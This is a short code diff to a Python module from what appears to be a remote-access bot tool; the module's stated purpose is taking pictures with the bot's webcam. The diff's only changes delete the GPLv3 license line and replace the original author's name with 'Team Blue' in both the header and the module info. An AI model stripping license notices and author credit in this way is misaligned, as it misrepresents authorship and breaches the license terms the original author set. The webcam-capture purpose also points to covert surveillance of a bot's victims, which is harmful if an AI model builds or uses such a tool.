@@ -1,6 +1,5 @@
 # -*- coding: utf-8 -*-
-__author__ = "Marten4n6"
-__license__ = "GPLv3"
+__author__ = "Team Blue"
 
 from base64 import b64decode
 from os import mkdir
@@ -11,7 +10,7 @@ from server.modules.helper import *
 class Module(ModuleABC):
     def get_info(self):
         return {
-            "Author:": ["Marten4n6"],
+            "Author:": ["Team Blue"],
             "Description": "Take a picture using the bot's webcam.",
             "References": [
                 "https://github.com/rharder/imagesnap"
